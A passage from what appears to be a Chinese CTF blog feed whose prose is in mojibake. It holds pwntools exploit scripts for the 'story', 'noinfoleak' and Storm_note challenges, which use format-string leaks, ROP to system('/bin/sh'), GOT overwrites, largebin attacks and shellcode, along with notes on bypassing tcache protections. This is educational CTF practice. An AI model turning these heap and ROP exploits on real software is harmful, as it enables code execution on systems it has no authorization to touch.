remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process(binary)</span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">buf = <span class="number">0x0804A040</span></span><br><span class="line">pay = <span class="string">&#x27;&#x27;</span></span><br><span class="line">pay += <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x16</span>-<span class="number">8</span>)</span><br><span class="line">pay += p32(<span class="number">0x804a062</span>)</span><br><span class="line">pay += <span class="string">&#x27;a&#x27;</span>*<span class="number">0x4</span></span><br><span class="line">pay += p32(<span class="number">0</span>)</span><br><span class="line">pay += p32(buf+<span class="number">0x16</span>+<span class="number">8</span>+<span class="number">4</span>)</span><br><span class="line">pay += p32(<span class="number">0x804a062</span>)</span><br><span class="line">code = asm(shellcraft.sh())</span><br><span class="line">pay += code</span><br><span class="line">sl(pay)</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">ti()</span><br></pre></td></tr></table></figure><p><img src="/2021/05/26/iscc2021/1622862309923-de617961-9eb3-4ab0-aada-36df4d6cbddc.png" alt="image.png"></p><p>è·³åˆ°shllcodeä¹‹åè¿è¡Œä¸åŠ¨äº†ï¼ŒåŸæ¥bssæ®µä¸Šä¸å¯æ‰§è¡Œ</p><p><img src="/2021/05/26/iscc2021/1622862421472-9e7ac221-6937-4584-856b-9f1807edf9ce.png" alt="image.png"></p><p>å¥½éº»çƒ¦ï¼Œä¸æƒ³åšäº†ï¼Œå»æ•´house of pigå¥½äº†/_ \</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;pycc&lt;/p&gt;
&lt;p&gt;å¥½å¤šæ¯”èµ›ï¼ŒæŠ½ç©ºæ‰“æ‰“baby pwn&lt;/p&gt;</summary>
    
    
    
    
    <category term="pwn" scheme="https://brooke-hub.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>tonight</title>
    <link href="https://brooke-hub.github.io/2021/04/21/tonight/"/>
    <id>https://brooke-hub.github.io/2021/04/21/tonight/</id>
    <published>2021-04-21T12:15:47.000Z</published>
    <updated>2021-06-05T08:57:16.006Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><p>åˆ’æ°´éšè®°</p><!--more--><h3 id="4-8"><a href="#4-8" class="headerlink" title="4.8"></a>4.8</h3><ul><li>é€šè¿‡ä¸€å­—èŠ‚ä¿®æ”¹mp_.tcache_binsï¼Œæ”¹å¤§ï¼Œå¹¶ä¸”æŠŠå­˜æ”¾åœ¨å †ç©ºé—´ä¸Šçš„tcache structå†…å®¹(ä¸€èˆ¬åœ¨top chunk)ä¿®æ”¹ä¸ºç›®æ ‡åœ°å€ï¼Œé‚£åœ¨è°ƒç”¨tcache_get<strong>æ ¹æ®tc_idxç´¢å¼•</strong>å–å †å—æ—¶å°±ä¼šè¶…è¿‡åŸæ¥çš„èŒƒå›´å‘ä¸‹å–å †å—ï¼Œå‡è®¾entries[tc_idx]æ°å¥½åˆä¸ä¸º0æ­¤ä¼¼ä¹ä¾¿ä¼šå°†èµ·è¿”å›ï¼Œä»è€Œç”³è¯·åˆ°ç›®æ ‡åœ°å€</li></ul><p><a href="https://mp.weixin.qq.com/s/xoc9LeME2fmIoWLM7IzTrw">VNCTF2021 LittleRedFlower</a></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1144313/1617852067326-b466d25c-efb4-4d9e-95da-a11680d56e18.png" alt="img"></p><ul><li><p>2.32å¯¹tcacheæ–°å¢çš„ä¿æŠ¤</p></li><li><p>fdæ˜¯(chunk_addr &gt;&gt; 12)^(tcache-&gt;entries)  </p></li><li><p>é‚£ä¹ˆç¬¬ä¸€ä¸ªtcache chunkçš„fd å°±æ˜¯(chunk_addr &gt;&gt; 12)^0 (æ³„éœ²å‡ºæ¥å†&lt;&lt;12å°±æ˜¯heap_baseå•¦)</p></li><li><p>ä¹‹å‰tcache attackæ˜¯ç›´æ¥æŠŠfdæ”¹ä¸º<code>ç›®æ ‡åœ°å€</code>å³å¯ï¼Œç°åœ¨æŠŠfdæ”¹ä¸º<code>(chunk_addr &gt;&gt; 12)^ç›®æ ‡åœ°å€</code>å°±å¯ä»¥å•¦</p></li><li><p>ç›´æ¥æ‰“åˆ°tcache_perthread_structï¼Œå¡«0x290çš„countä¸º7ï¼Œfree è¯¥chunkå°±è¿›å…¥äº†unosrtedbinï¼</p></li><li><p>ä¹‹åæŠŠunosrtedbin addrè¸©åˆ°tcacheçš„æŒ‡é’ˆå¤„ï¼Œçˆ†ç ´ä¸€ä½ï¼Œç”³è¯·åˆ°_IO_2_1_stdout_</p></li><li><p>å¾—åˆ°libcä¹‹åæ¥ç€æ”¹tcacheæŒ‡é’ˆ</p></li><li><p><a href="https://mp.weixin.qq.com/s/1OzuKnQK2wNxhHYObN3UYA">VNCTF2021 ff</a></p></li></ul><ul><li><p>pwntools å¯ä»¥ä½¿ç”¨ <code>shutdown_raw(direction=&#39;send&#39;)</code> å…³é—­ç®¡é“çš„ send æ–¹å‘ï¼Œä½¿è¿œç¨‹ <code>read()</code> è¯»åˆ° EOFï¼Œè¿”å› 0</p></li><li><p>æ•°ç»„-1è¶Šç•Œï¼Œçˆ†ç ´ï¼Œå¦‚æœç¨‹åºä»»æ„ç”³è¯·åˆ°äº†flagé™„è¿‘çš„chunkï¼Œå¯ç›´æ¥æ³„éœ²flag</p></li></ul><h3 id="4-10"><a href="#4-10" class="headerlink" title="4.10"></a>4.10</h3><ul><li><p>huxiangbei_2019_namesystem </p></li><li><p>åˆ é™¤chunkæ—¶å…¨å±€æ•°ç»„indexæ¼äº†å¤„ç†æœ€åä¸€ä½ï¼ŒæŒ‡é’ˆæ‚¬ç©º</p></li><li><p>æ²¡æœ‰showåŠŸèƒ½ä½†æ˜¯å¯ä»¥æ”¹free@gotä¸ºprintf@pltï¼Œåœ¨ä¸€ä¸ªchunkä¸­å†™å…¥fmtï¼Œå¯¹æ ˆè¿›è¡Œæ³„æ¼ï¼Œå¾—åˆ°libc</p></li><li><p>è¦æå‰å¸ƒç½®å¥½ä¸¤ä¸ªdouble freeï¼Œå› ä¸ºæ”¹å®Œfree@gotå°±ä¸èƒ½æ­£å¸¸ç”¨freeäº†</p></li></ul><h3 id="4-11"><a href="#4-11" class="headerlink" title="4.11"></a>4.11</h3><h3 id="4-12"><a href="#4-12" class="headerlink" title="4.12"></a>4.12</h3><h3 id="4-13"><a href="#4-13" class="headerlink" title="4.13"></a>4.13</h3><p>2019è¥¿æ¹–è®ºå‰‘é¢„é€‰</p><p><strong>story</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">binary=<span class="string">&#x27;./story&#x27;</span></span><br><span class="line">sh=process(binary)</span><br><span class="line"><span class="comment"># sh=remote(&#x27;node3.buuoj.cn&#x27;,29146)</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># libc=ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;Your ID:&#x27;</span>,<span class="string">&#x27;%15$p.%25$p&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary=<span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;.&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">leak(<span class="string">&#x27;canary&#x27;</span>,canary)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base =<span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>) - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>] - <span class="number">240</span></span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>,libc_base) </span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;the size of your story:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x400</span>))</span><br><span class="line">pop_rdi=<span class="number">0x0000000000400bd3</span></span><br><span class="line">binsh_addr=libc_base+libc.search(<span class="string">&#x27;/bin/sh\x00&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">sla(<span class="string">&#x27;story:&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x90</span>-<span class="number">0x8</span>)+p64(canary)+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(pop_rdi)+p64(binsh_addr)+p64(system))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">ti()</span><br></pre></td></tr></table></figure><h3 id="4-14"><a href="#4-14" class="headerlink" title="4.14"></a>4.14</h3><p><strong>noinfoleak</strong></p><p>å…¨å±€æŒ‡é’ˆä¸Šé¢çš„stdinå†…å®¹å¯ä»¥ä¼ªé€ chunk size</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">binary=<span class="string">&#x27;./noinfoleak&#x27;</span></span><br><span class="line">sh=process(binary)</span><br><span class="line"><span class="comment"># sh=remote(&#x27;node3.buuoj.cn&#x27;,29146)</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># libc=ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leaklibc</span>():</span></span><br><span class="line">    <span class="keyword">global</span> libc_base,__malloc_hook,__free_hook,system,binsh_addr,_IO_2_1_stdout_,_IO_list_all</span><br><span class="line">    libc_base = u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">    success(<span class="string">&#x27;libc_base = &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    __malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    __free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">sa(<span class="string">&#x27;&gt;&#x27;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">sa(<span class="string">&#x27;&gt;&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">chunk_list=<span class="number">0x0000000006010A0</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;a\n&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;a\n&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(chunk_list-<span class="number">0x13</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;a\n&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x3</span>+p64(elf.got[<span class="string">&#x27;free&#x27;</span>])+p64(<span class="number">0x60</span>)+p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>])+p64(<span class="number">0x60</span>)+<span class="string">&#x27;\n&#x27;</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># add(0x50,&#x27;a\n&#x27;)#4</span></span><br><span class="line">edit(<span class="number">0</span>,p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">leaklibc()</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(system))</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">ti()</span><br></pre></td></tr></table></figure><p><strong>Note_Storm</strong></p><p>libc2.23</p><p>largebin attack</p><p>ç¦ç”¨äº†fastbinï¼Œsizeå¯ä»¥å¾ˆå¤§ï¼Œç”³è¯·åˆ°0xABCD0100ä»»æ„å†™å°±å¯ä»¥ç»•è¿‡æ£€æŸ¥</p><p>æœ‰off by nullæ„é€ chunk overlap</p><p>è®¾ç½®fake pre size</p><p>dele ä¸€ä¸ªå¤§chunk0ï¼Œå˜æˆunsortedchunk</p><p>off by nullä¿®æ”¹unsortedchunk çš„ pre inuseï¼Œå¹¶æ”¹å°size</p><p>åˆ‡å‰²åˆ†é…unsortedchunkä¸ºä¸€ä¸ªå°chunkå’Œä¸€ä¸ªå¤§chunk1ï¼ˆè¦ç»•è¿‡sizeå’Œå¯¹åº”pre sizeçš„æ£€æŸ¥ï¼Œè¿™æ˜¯å‰é¢è®¾ç½®çš„fake pre sizeçš„ä½œç”¨ï¼‰</p><p>dele å°chunk</p><p>å†deleæœ€å¼€å§‹é‚£ä¸ªå¤§chunk0åé¢çš„chunkï¼Œç”±äºå®ƒçš„pre sizeè¿˜ä¿å­˜ç€æœ€å¼€å§‹é‚£ä¸ªå¤§chunk0çš„sizeï¼Œå®ƒä¼šç›´æ¥å…¨éƒ¨åˆå¹¶ï¼Œè¿™é‡Œé¢å°±åŒ…æ‹¬äº†è¿˜æœªè¢«freeçš„å¤§chunk1</p><p>åˆ‡å‰²åˆ†é…unsortedchunkä¸ºä¸€ä¸ªå°chunkå’Œä¸€ä¸ªå¤§chunk2ï¼Œå°±å®ç°ä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘åŒä¸€å—å†…å®¹</p><p>ä¿®æ”¹unsortedbin</p><p> <code>bk</code>ä¸º <code>fake chunkï¼ˆ``0xABCD0100 -0x20``ï¼‰</code></p><p>ä¿®æ”¹largebinï¼ˆä»unsortedbinç”³è¯·ä¸€ä¸ªchunkï¼Œä¼šæŠŠå‰©ä½™chunkæ”¾å…¥largebinï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bk&#96;ä¸º &#96;fake_chunk+8</span><br><span class="line">bk-&gt;nextsize&#96;ä¸º &#96;fake_chunk-0x18-5</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">binary=<span class="string">&#x27;./Storm_note&#x27;</span></span><br><span class="line">sh=process(binary)</span><br><span class="line"><span class="comment"># sh=remote(&#x27;node3.buuoj.cn&#x27;,29146)</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># libc=ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leaklibc</span>():</span></span><br><span class="line">    <span class="keyword">global</span> libc_base,__malloc_hook,__free_hook,system,binsh_addr,_IO_2_1_stdout_,_IO_list_all</span><br><span class="line">    libc_base = u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">    success(<span class="string">&#x27;libc_base = &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    __malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    __free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">index</span>):</span></span><br><span class="line">sla(<span class="string">&#x27;Choice: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">&#x27;size ?&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"><span class="comment"># sa(&#x27;&gt;&#x27;,content)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">sla(<span class="string">&#x27;Index ?&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">sla(<span class="string">&#x27;Index ?&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">sa(<span class="string">&#x27;Content:&#x27;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor</span>(<span class="params">buff</span>):</span></span><br><span class="line">cmd(<span class="number">666</span>)</span><br><span class="line">sa(<span class="string">&#x27;let you in&#x27;</span>,buff)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x508</span>)    <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#2</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">&#x27;h&#x27;</span>*<span class="number">0x4f0</span> + p64(<span class="number">0x500</span>))   <span class="comment">#set fake prev_size</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x508</span>)    <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#5</span></span><br><span class="line">edit(<span class="number">4</span>, <span class="string">&#x27;h&#x27;</span>*<span class="number">0x4f0</span> + p64(<span class="number">0x500</span>))   <span class="comment">#set fake prev_size</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ================================================================</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&#x27;h&#x27;</span>*(<span class="number">0x18</span>))    <span class="comment">#off-by-one chunk1 0x510-&gt;0x500</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x4d8</span>)    <span class="comment">#7</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)         <span class="comment">#backward consolidate</span></span><br><span class="line">add(<span class="number">0x38</span>)     <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x4e8</span>)    <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">3</span>, <span class="string">&#x27;h&#x27;</span>*(<span class="number">0x18</span>))    <span class="comment">#off-by-one</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x4d8</span>)    <span class="comment">#8</span></span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">dele(<span class="number">5</span>)         <span class="comment">#backward consolidate</span></span><br><span class="line">add(<span class="number">0x48</span>)     <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">2</span>) <span class="comment"># two chunks in unsortedbin</span></span><br><span class="line">add(<span class="number">0x4e8</span>)    <span class="comment">#2 now malloc unsortedchunk2 and put unsortedchcunk5 to largebin</span></span><br><span class="line">dele(<span class="number">2</span>) <span class="comment"># in unsortedbin</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># modify unsortedbin</span></span><br><span class="line">storage = <span class="number">0xabcd0100</span></span><br><span class="line">fake_chunk = storage - <span class="number">0x20</span></span><br><span class="line">p1 = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4f1</span>) <span class="comment">#size</span></span><br><span class="line">p1 += p64(<span class="number">0</span>) + p64(fake_chunk)      <span class="comment">#bk</span></span><br><span class="line">edit(<span class="number">7</span>, p1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># modify largebin</span></span><br><span class="line">p2 = p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4e1</span>) <span class="comment">#size</span></span><br><span class="line">p2 += p64(<span class="number">0</span>) + p64(fake_chunk+<span class="number">8</span>)    <span class="comment">#bk, for creating the &quot;bk&quot; of the faked chunk to avoid crashing when unlinking from unsorted bin</span></span><br><span class="line">p2 += p64(<span class="number">0</span>) + p64(fake_chunk-<span class="number">0x18</span>-<span class="number">5</span>)   <span class="comment">#bk_nextsize, for creating the &quot;size&quot; of the 